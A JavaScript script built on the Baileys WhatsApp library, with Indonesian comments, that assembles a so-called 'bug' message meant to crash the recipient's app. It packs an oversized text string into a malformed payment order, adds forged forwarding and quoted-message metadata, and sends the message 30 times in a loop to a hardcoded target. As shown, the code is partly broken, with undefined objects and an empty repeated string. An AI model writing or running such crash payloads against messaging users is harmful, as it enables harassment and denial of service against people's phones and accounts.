const baileys = require('@whiskeysockets/baileys');
const { nerakatxt12 } = require('./77/nerakatxt12');

let bug = "".repeat(600000); // Karakter bug yang akan dimasukkan
let target = "120363144038483540@newsletter"; // Nomor tujuan target

async function sendBugMessage(target) {
    for (let i = 0; i < 30; i++) {
        // Struktur pesan bug
        const forwardedMessageInfo = {
            newsletterJid: "120363144038483540@newsletter",
            newsletterName: "relog -> buka chat ini -> crash",
            serverMessageId: 0x2
        };

        const thumbnail = {
            hasMediaAttachment: [],
            jpegThumbnail: global.bimg // Thumbnail global
        };

        const buttonParams = {
            name: "review_and_pay",
            buttonParamsJson: JSON.stringify({
                currency: "MYR",
                total_amount: { value: 69696969, offset: 100 },
                reference_id: "4ONSAXV76KN",
                type: "physical-goods",
                order: {
                    status: "payment_requested",
                    subtotal: { value: 19999800, offset: 100 },
                    order_type: "ORDER",
                    items: [
                        {
                            retailer_id: "7537631592926009",
                            product_id: "7999631592926009",
                            name: nerakatxt12, // Nama dari objek xbugtex
                            amount: { value: 9999900, offset: 100 },
                            quantity: 1
                        },
                        {
                            retailer_id: "7842674605763435",
                            product_id: "7842674605763435",
                            name: `𝑵𝑬𝑹𝑨𝑲𝑨🩸 ${bug}`, // Teks bug besar
                            amount: { value: 9999900, offset: 100 },
                            quantity: 1
                        }
                    ]
                },
                native_payment_methods: []
            })
        };

        const interactiveMessage = {
            header: thumbnail,
            nativeFlowMessage: { buttons: [buttonParams] }
        };

        const quotedMessage = {
            interactiveMessage
        };

        const contextInfo = {
            isForwarded: true,
            forwardedNewsletterMessageInfo: forwardedMessageInfo,
            stanzaId: "BAE526D352FE4CDF",
            participant: "0@s.whatsapp.net",
            quotedMessage: quotedMessage,
            remoteJid: "status@broadcast"
        };

        const message = {
            extendedTextMessage: {
                text: '🕱𝑵𝑬𝑹𝑨𝑲𝑨🕱',
                contextInfo: contextInfo
            }
        };
        await Nerakaz.relayMessage(target, message, {});
        const emptyMessage = { 
            text: '' 
        };
        const options = { 
            quoted: xbug2 
        };
        await Nerakaz.sendMessage(target, emptyMessage, options);
    }
}